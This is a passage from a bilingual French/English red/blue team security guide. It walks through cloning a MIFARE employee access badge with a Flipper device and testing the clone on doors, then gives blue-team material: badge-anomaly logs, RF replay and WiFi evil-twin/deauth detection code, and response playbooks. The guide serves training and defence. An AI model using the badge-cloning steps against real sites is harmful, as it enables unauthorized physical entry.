<span class="nc">Timestamp</span><span class="err">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">26</span><span class="nl">T15</span><span class="p">:</span><span class="mi">42</span><span class="err">:</span><span class="mi">31</span>
<span class="k">Action</span><span class="err">:</span><span class="w"> </span><span class="n">HVAC</span><span class="w"> </span><span class="n">emergency</span><span class="w"> </span><span class="k">shutdown</span><span class="w"> </span><span class="n">triggered</span>
</code></pre></div>

<p><em>Analyse des mod√®les :</em>
- D√©tection de valeurs aberrantes (algorithmes ML)
- Corr√©lation multi-capteurs (√©cart de temp√©rature anormal)
- V√©rification des signatures RF (d√©tection d'usurpation)</p>
<h4 id="scenario-6-compromission-de-badge-rfidnfc">üî¥ Sc√©nario 6 : Compromission de Badge RFID/NFC</h4>
<h3 id="rfidnfc-badge-compromise">RFID/NFC Badge Compromise</h3>
<p><strong>Contexte / Context</strong></p>
<p><strong>Fran√ßais :</strong> Clonage et utilisation malveillante de badges d'acc√®s employ√©. </p>
<p><strong>English :</strong> Cloning and malicious use of employee access badges.</p>
<p><strong>Proc√©dure Red Team D√©taill√©e / Detailed Red Team Procedure</strong></p>
<p><em>Phase 1 : Identification du type de badge</em></p>
<div class="codehilite"><pre><span></span><code>NFC<span class="w"> </span>‚Üí<span class="w"> </span>Read<span class="w"> </span>Card
-<span class="w"> </span>Approcher<span class="w"> </span>le<span class="w"> </span>badge<span class="w"> </span>du<span class="w"> </span>Flipper
-<span class="w"> </span>Identifier<span class="w"> </span>le<span class="w"> </span>type:<span class="w"> </span>MIFARE<span class="w"> </span>Classic/DESFire/NTAG
-<span class="w"> </span>Noter<span class="w"> </span>l<span class="err">&#39;</span>UID<span class="w"> </span>et<span class="w"> </span>les<span class="w"> </span>secteurs<span class="w"> </span>accessibles
</code></pre></div>

<p><em>Exemple de lecture badge :</em></p>
<div class="codehilite"><pre><span></span><code><span class="n">Card</span><span class="w"> </span><span class="n">Type</span><span class="o">:</span><span class="w"> </span><span class="n">MIFARE</span><span class="w"> </span><span class="n">Classic</span><span class="w"> </span><span class="mi">1</span><span class="n">K</span>
<span class="nl">UID</span><span class="p">:</span><span class="w"> </span><span class="mo">04</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="n">F3</span><span class="o">:</span><span class="mi">2</span><span class="n">A</span><span class="o">:</span><span class="n">B8</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">80</span>
<span class="nl">SAK</span><span class="p">:</span><span class="w"> </span><span class="mi">08</span>
<span class="nl">ATQA</span><span class="p">:</span><span class="w"> </span><span class="mo">00</span><span class="o">:</span><span class="mo">04</span>

<span class="n">Secteurs</span><span class="w"> </span><span class="n">lisibles</span><span class="o">:</span>
<span class="n">Secteur</span><span class="w"> </span><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">Donn√©es</span><span class="w"> </span><span class="n">fabricant</span><span class="p">]</span>
<span class="n">Secteur</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">ID</span><span class="w"> </span><span class="n">Employ√©</span><span class="o">:</span><span class="w"> </span><span class="n">EMP001234</span><span class="p">]</span>
<span class="n">Secteur</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">D√©partement</span><span class="o">:</span><span class="w"> </span><span class="n">IT</span><span class="o">-</span><span class="n">SEC</span><span class="p">]</span>
<span class="n">Secteur</span><span class="w"> </span><span class="mi">3</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">Niveau</span><span class="w"> </span><span class="n">acc√®s</span><span class="o">:</span><span class="w"> </span><span class="mi">3</span><span class="p">]</span>
</code></pre></div>

<p><em>Phase 2 : Clonage du badge</em></p>
<div class="codehilite"><pre><span></span><code>NFC<span class="w"> </span>‚Üí<span class="w"> </span>Write<span class="w"> </span>to<span class="w"> </span>Card
-<span class="w"> </span>Ins√©rer<span class="w"> </span>une<span class="w"> </span>carte<span class="w"> </span>vierge<span class="w"> </span>compatible
-<span class="w"> </span>Copier<span class="w"> </span>tous<span class="w"> </span>les<span class="w"> </span>secteurs<span class="w"> </span>accessibles
-<span class="w"> </span>V√©rifier<span class="w"> </span>l<span class="err">&#39;</span>int√©grit√©<span class="w"> </span>des<span class="w"> </span>donn√©es
-<span class="w"> </span>Tester<span class="w"> </span>le<span class="w"> </span>clone<span class="w"> </span>sur<span class="w"> </span>un<span class="w"> </span>lecteur
</code></pre></div>

<p><em>Phase 3 : Test d'acc√®s</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Test sur diff√©rents lecteurs</span>
R√©sultats:
-<span class="w"> </span>Porte<span class="w"> </span>principale:<span class="w"> </span>‚úÖ<span class="w"> </span>Acc√®s<span class="w"> </span>autoris√©
-<span class="w"> </span>Ascenseur:<span class="w"> </span>‚úÖ<span class="w"> </span>Niveau<span class="w"> </span><span class="m">3</span><span class="w"> </span>accessible
-<span class="w"> </span>Salle<span class="w"> </span>serveur:<span class="w"> </span>‚ùå<span class="w"> </span>Acc√®s<span class="w"> </span>refus√©<span class="w"> </span><span class="o">(</span>niveau<span class="w"> </span><span class="m">4</span><span class="w"> </span>requis<span class="o">)</span>
-<span class="w"> </span>Parking:<span class="w"> </span>‚úÖ<span class="w"> </span>Acc√®s<span class="w"> </span>autoris√©
</code></pre></div>

<p><strong>D√©tection Blue Team / Blue Team Detection</strong></p>
<p><em>Anomalies dans les logs d'acc√®s :</em></p>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">ALERT</span><span class="o">]</span><span class="w"> </span><span class="n">Badge</span><span class="w"> </span><span class="k">usage</span><span class="w"> </span><span class="n">anomaly</span><span class="w"> </span><span class="n">detected</span>
<span class="n">Badge</span><span class="w"> </span><span class="nl">ID</span><span class="p">:</span><span class="w"> </span><span class="n">EMP001234</span><span class="w"> </span><span class="p">(</span><span class="n">John</span><span class="w"> </span><span class="n">Doe</span><span class="p">)</span>
<span class="mi">15</span><span class="err">:</span><span class="mi">23</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Door</span><span class="w"> </span><span class="n">A01</span><span class="w"> </span><span class="p">(</span><span class="n">Main</span><span class="w"> </span><span class="n">entrance</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">SUCCESS</span>
<span class="mi">15</span><span class="err">:</span><span class="mi">23</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Door</span><span class="w"> </span><span class="n">A01</span><span class="w"> </span><span class="p">(</span><span class="n">Main</span><span class="w"> </span><span class="n">entrance</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">SUCCESS</span><span class="w">  </span>
<span class="mi">15</span><span class="err">:</span><span class="mi">23</span><span class="err">:</span><span class="mi">47</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Door</span><span class="w"> </span><span class="n">A01</span><span class="w"> </span><span class="p">(</span><span class="n">Main</span><span class="w"> </span><span class="n">entrance</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">SUCCESS</span>

<span class="nl">Analysis</span><span class="p">:</span><span class="w"> </span><span class="n">Multiple</span><span class="w"> </span><span class="n">rapid</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">attempts</span>
<span class="nl">Risk</span><span class="p">:</span><span class="w"> </span><span class="n">Possible</span><span class="w"> </span><span class="n">cloned</span><span class="w"> </span><span class="n">badge</span>
<span class="k">Action</span><span class="err">:</span><span class="w"> </span><span class="n">Badge</span><span class="w"> </span><span class="n">temporarily</span><span class="w"> </span><span class="n">disabled</span>
</code></pre></div>

<h2 id="chapitre-9-strategies-blue-team-avancees">Chapitre 9 : Strat√©gies Blue Team Avanc√©es</h2>
<h3 id="advanced-blue-team-strategies">Advanced Blue Team Strategies</h3>
<h4 id="detection-et-reponse-aux-attaques-rf">üîëÔ∏è D√©tection et R√©ponse aux Attaques RF</h4>
<h3 id="rf-attack-detection-and-response">RF Attack Detection and Response</h3>
<p><strong>Syst√®me de Monitoring RF Complet</strong></p>
<p><em>Architecture de d√©tection :</em></p>
<div class="codehilite"><pre><span></span><code>‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ         SYST√àME DE D√âTECTION RF         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  üì° Capteurs RF distribu√©s             ‚îÇ
‚îÇ  ‚Ä¢ Analyseurs de spectre               ‚îÇ
‚îÇ  ‚Ä¢ R√©cepteurs large bande              ‚îÇ  
‚îÇ  ‚Ä¢ D√©tecteurs d&#39;anomalies              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  üîç Analyse en temps r√©el              ‚îÇ
‚îÇ  ‚Ä¢ D√©tection de replay attacks         ‚îÇ
‚îÇ  ‚Ä¢ Identification de brouilleurs       ‚îÇ
‚îÇ  ‚Ä¢ Corr√©lation avec logs physiques     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  ‚ö° R√©ponse automatique                ‚îÇ
‚îÇ  ‚Ä¢ Alertes SOC instantan√©es            ‚îÇ
‚îÇ  ‚Ä¢ Verrouillage automatique            ‚îÇ
‚îÇ  ‚Ä¢ Notification √©quipes s√©curit√©       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
</code></pre></div>

<p><em>Configuration du monitoring :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Exemple de configuration avec rtl-sdr</span>
rtl_433<span class="w"> </span>-f<span class="w"> </span><span class="m">433920000</span><span class="w"> </span>-s<span class="w"> </span><span class="m">250000</span><span class="w"> </span>-F<span class="w"> </span>json<span class="w"> </span>-M<span class="w"> </span>time:iso:usec<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
<span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>line<span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$line</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>python3<span class="w"> </span>rf_analyzer.py<span class="w"> </span>--detect-replay
<span class="k">done</span>
</code></pre></div>

<p><em>Script de d√©tection d'attaques RF :</em></p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>

<span class="k">class</span> <span class="nc">RFSecurityMonitor</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">recent_signals</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">alert_threshold</span> <span class="o">=</span> <span class="mi">3</span>  <span class="c1"># Nombre de r√©p√©titions suspectes</span>

    <span class="k">def</span> <span class="nf">analyze_signal</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">signal_id</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;unknown&#39;</span><span class="p">)</span>
        <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>

        <span class="c1"># D√©tecter les attaques par rejeu</span>
        <span class="k">if</span> <span class="n">signal_id</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">recent_signals</span><span class="p">:</span>
            <span class="n">last_seen</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">recent_signals</span><span class="p">[</span><span class="n">signal_id</span><span class="p">][</span><span class="s1">&#39;last_seen&#39;</span><span class="p">]</span>
            <span class="n">count</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">recent_signals</span><span class="p">[</span><span class="n">signal_id</span><span class="p">][</span><span class="s1">&#39;count&#39;</span><span class="p">]</span>

            <span class="k">if</span> <span class="n">timestamp</span> <span class="o">-</span> <span class="n">last_seen</span> <span class="o">&lt;</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">minutes</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
                <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
                <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">alert_threshold</span><span class="p">:</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">trigger_alert</span><span class="p">(</span><span class="n">signal_id</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">recent_signals</span><span class="p">[</span><span class="n">signal_id</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;last_seen&#39;</span><span class="p">:</span> <span class="n">timestamp</span><span class="p">,</span>
            <span class="s1">&#39;count&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">recent_signals</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">signal_id</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;count&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">data</span>
        <span class="p">}</span>

    <span class="k">def</span> <span class="nf">trigger_alert</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">signal_id</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">alert</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;RF_REPLAY_ATTACK&#39;</span><span class="p">,</span>
            <span class="s1">&#39;signal_id&#39;</span><span class="p">:</span> <span class="n">signal_id</span><span class="p">,</span>
            <span class="s1">&#39;repeat_count&#39;</span><span class="p">:</span> <span class="n">count</span><span class="p">,</span>
            <span class="s1">&#39;frequency&#39;</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;freq&#39;</span><span class="p">,</span> <span class="s1">&#39;unknown&#39;</span><span class="p">),</span>
            <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">isoformat</span><span class="p">(),</span>
            <span class="s1">&#39;severity&#39;</span><span class="p">:</span> <span class="s1">&#39;HIGH&#39;</span>
        <span class="p">}</span>

        <span class="c1"># Envoi vers le SIEM</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_to_siem</span><span class="p">(</span><span class="n">alert</span><span class="p">)</span>

        <span class="c1"># Notification imm√©diate</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_notification</span><span class="p">(</span><span class="n">alert</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">send_to_siem</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">alert</span><span class="p">):</span>
        <span class="c1"># Int√©gration avec Splunk, ELK, etc.</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[SIEM ALERT] </span><span class="si">{</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">alert</span><span class="p">,</span><span class="w"> </span><span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">send_notification</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">alert</span><span class="p">):</span>
        <span class="c1"># SMS/Email vers l&#39;√©quipe s√©curit√©</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[SECURITY ALERT] Possible RF replay attack detected!&quot;</span><span class="p">)</span>

<span class="c1"># Utilisation</span>
<span class="n">monitor</span> <span class="o">=</span> <span class="n">RFSecurityMonitor</span><span class="p">()</span>
</code></pre></div>

<h4 id="detection-dattaques-wifi">üîëÔ∏è D√©tection d'Attaques WiFi</h4>
<h3 id="wifi-attack-detection">WiFi Attack Detection</h3>
<p><strong>Configuration WIDS/WIPS Avanc√©e</strong></p>
<p><em>D√©ploiement de capteurs WiFi :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Configuration avec Kismet</span>
kismet<span class="w"> </span>-c<span class="w"> </span>wlan0mon<span class="w"> </span>-c<span class="w"> </span>wlan1mon<span class="w"> </span>--override<span class="w"> </span>wardrive<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>--log-types<span class="w"> </span>pcapng,kismet,alert<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>--log-title<span class="w"> </span><span class="s2">&quot;Corporate_WIDS&quot;</span>
</code></pre></div>

<p><em>R√®gles de d√©tection personnalis√©es :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># D√©tection d&#39;Evil Twin</span>
<span class="k">def</span> <span class="nf">detect_evil_twin</span><span class="p">():</span>
    <span class="n">known_aps</span> <span class="o">=</span> <span class="n">load_authorized_aps</span><span class="p">()</span>
    <span class="n">detected_aps</span> <span class="o">=</span> <span class="n">scan_wireless_environment</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">ap</span> <span class="ow">in</span> <span class="n">detected_aps</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;ssid&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">[</span><span class="n">authorized</span><span class="p">[</span><span class="s1">&#39;ssid&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">authorized</span> <span class="ow">in</span> <span class="n">known_aps</span><span class="p">]:</span>
            <span class="n">authorized_ap</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">a</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">known_aps</span> <span class="k">if</span> <span class="n">a</span><span class="p">[</span><span class="s1">&#39;ssid&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;ssid&#39;</span><span class="p">])</span>

            <span class="c1"># V√©rifier si le BSSID correspond</span>
            <span class="k">if</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;bssid&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="n">authorized_ap</span><span class="p">[</span><span class="s1">&#39;bssid&#39;</span><span class="p">]:</span>
                <span class="n">alert</span> <span class="o">=</span> <span class="p">{</span>
                    <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;EVIL_TWIN_DETECTED&#39;</span><span class="p">,</span>
                    <span class="s1">&#39;rogue_bssid&#39;</span><span class="p">:</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;bssid&#39;</span><span class="p">],</span>
                    <span class="s1">&#39;legitimate_bssid&#39;</span><span class="p">:</span> <span class="n">authorized_ap</span><span class="p">[</span><span class="s1">&#39;bssid&#39;</span><span class="p">],</span>
                    <span class="s1">&#39;ssid&#39;</span><span class="p">:</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;ssid&#39;</span><span class="p">],</span>
                    <span class="s1">&#39;channel&#39;</span><span class="p">:</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;channel&#39;</span><span class="p">],</span>
                    <span class="s1">&#39;signal_strength&#39;</span><span class="p">:</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;signal&#39;</span><span class="p">],</span>
                    <span class="s1">&#39;security&#39;</span><span class="p">:</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">]</span>
                <span class="p">}</span>
                <span class="n">trigger_immediate_response</span><span class="p">(</span><span class="n">alert</span><span class="p">)</span>

<span class="c1"># D√©tection d&#39;attaques Deauth</span>
<span class="k">def</span> <span class="nf">detect_deauth_flood</span><span class="p">():</span>
    <span class="n">DEAUTH_THRESHOLD</span> <span class="o">=</span> <span class="mi">50</span>  <span class="c1"># frames par minute</span>

    <span class="n">deauth_count</span> <span class="o">=</span> <span class="n">count_deauth_frames</span><span class="p">(</span><span class="n">time_window</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">deauth_count</span> <span class="o">&gt;</span> <span class="n">DEAUTH_THRESHOLD</span><span class="p">:</span>
        <span class="n">alert</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;DEAUTH_FLOOD_ATTACK&#39;</span><span class="p">,</span>
            <span class="s1">&#39;frames_count&#39;</span><span class="p">:</span> <span class="n">deauth_count</span><span class="p">,</span>
            <span class="s1">&#39;time_window&#39;</span><span class="p">:</span> <span class="mi">60</span><span class="p">,</span>
            <span class="s1">&#39;affected_clients&#39;</span><span class="p">:</span> <span class="n">get_affected_clients</span><span class="p">(),</span>
            <span class="s1">&#39;source_analysis&#39;</span><span class="p">:</span> <span class="n">analyze_attack_source</span><span class="p">()</span>
        <span class="p">}</span>

        <span class="c1"># R√©ponse automatique</span>
        <span class="n">enable_pmf_protection</span><span class="p">()</span>
        <span class="n">change_wifi_channel</span><span class="p">()</span>
        <span class="n">notify_security_team</span><span class="p">(</span><span class="n">alert</span><span class="p">)</span>
</code></pre></div>

<h4 id="reponse-incidentielle-automatisee">üîëÔ∏è R√©ponse Incidentielle Automatis√©e</h4>
<h3 id="automated-incident-response">Automated Incident Response</h3>
<p><strong>Playbook de R√©ponse Automatique</strong></p>
<p><em>R√©ponse aux attaques RF :</em></p>
<div class="codehilite"><pre><span></span><code><span class="nt">RF_Attack_Response_Playbook</span><span class="p">:</span>
<span class="w">  </span><span class="nt">trigger</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">RF_REPLAY_ATTACK_DETECTED</span>

<span class="w">  </span><span class="nt">immediate_actions</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">disable_affected_device</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">alert_security_team</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">start_recording</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>

<span class="w">  </span><span class="nt">investigation_steps</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">correlate_with_physical_logs</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">check_video_surveillance</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">analyze_signal_characteristics</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">identify_attack_source</span>

<span class="w">  </span><span class="nt">containment</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">temporary_disable_rf_systems</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">increase_physical_security</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">deploy_rf_detection_team</span>

<span class="w">  </span><span class="nt">recovery</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">implement_rolling_codes</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">update_security_policies</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">retrain_security_personnel</span>
</code></pre></div>

<p><em>R√©ponse aux attaques WiFi :</em></p>
<div class="codehilite"><pre><span></span><code><span class="nt">WiFi_Attack_Response_Playbook</span><span class="p">:</span>
<span class="w">  </span><span class="nt">trigger</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">EVIL_TWIN_DETECTED</span>

<span class="w">  </span><span class="nt">immediate_actions</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">isolate_rogue_ap</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">broadcast_warning</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Security</span><span class="nv"> </span><span class="s">Alert:</span><span class="nv"> </span><span class="s">Unauthorized</span><span class="nv"> </span><span class="s">WiFi</span><span class="nv"> </span><span class="s">network</span><span class="nv"> </span><span class="s">detected&quot;</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">enable_additional_monitoring</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>

<span class="w">  </span><span class="nt">investigation_steps</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">triangulate_ap_location</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">analyze_captured_traffic</span><span class="w">  </span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">identify_connected_clients</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">assess_data_compromise</span>

<span class="w">  </span><span class="nt">containment</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">deploy_security_team_to_location</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">disconnect_affected_clients</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">change_wifi_passwords</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">enable_802.11w_protection</span>

<span class="w">  </span><span class="nt">recovery</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">conduct_forensic_analysis</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">update_user_credentials</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">implement_additional_wids_sensors</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">security_awareness_training</span>
</code></pre></div>

<h2 id="chapitre-10-outils-de-detection-avances">Chapitre 10 : Outils de D√©tection Avanc√©s</h2>
